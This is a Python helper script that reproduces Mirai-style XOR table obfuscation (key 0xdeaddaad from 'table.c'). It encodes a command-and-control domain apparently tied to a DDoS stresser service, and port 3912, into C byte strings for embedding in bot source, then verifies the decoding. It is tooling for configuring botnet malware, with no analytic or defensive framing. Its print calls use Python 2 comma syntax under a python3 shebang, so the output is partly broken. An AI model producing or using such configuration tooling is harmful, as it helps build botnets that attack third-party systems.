#!/usr/bin/env python3

# XOR key from table.c: 0xdeaddaad
k1 = 0xad
k2 = 0xda
k3 = 0xad
k4 = 0xde

def obfuscate(data):
    """Obfuscate data using the XOR keys"""
    result = []
    keys = [k1, k2, k3, k4]
    for i, byte in enumerate(data):
        val = ord(byte) if isinstance(byte, str) else byte
        val ^= keys[0]
        val ^= keys[1]
        val ^= keys[2]
        val ^= keys[3]
        result.append(val)
    return bytes(result)

# Obfuscate the domain
domain = "bigbomboclaat.corestresser.cc"
obf_domain = obfuscate(domain.encode())
print("Domain: " + domain)
print("Length: " + str(len(domain)))
print("C format: \""),
for i in range(len(obf_domain)):
    byte_val = ord(obf_domain[i:i+1]) if isinstance(obf_domain, str) else obf_domain[i]
    print("\\x%02x" % byte_val),
print("\\x04\"")

# Obfuscate the port (3912 = 0x0F48 in network byte order)
port_bytes = bytes([0x0F, 0x48])
obf_port = obfuscate(port_bytes)
print("\nPort: 3912 (0x0F48)")
print("C format: \""),
for i in range(len(obf_port)):
    byte_val = ord(obf_port[i:i+1]) if isinstance(obf_port, str) else obf_port[i]
    print("\\x%02X" % byte_val),
print("\"")

# Verify by deobfuscating
print("\nVerifying domain deobfuscation:")
deobf_domain = obfuscate(obf_domain)
print("Deobfuscated: " + deobf_domain.decode())

print("\nVerifying port deobfuscation:")
deobf_port = obfuscate(obf_port)
port_value = (deobf_port[0] << 8) | deobf_port[1]
print("Deobfuscated port: %d (0x%04X)" % (port_value, port_value))

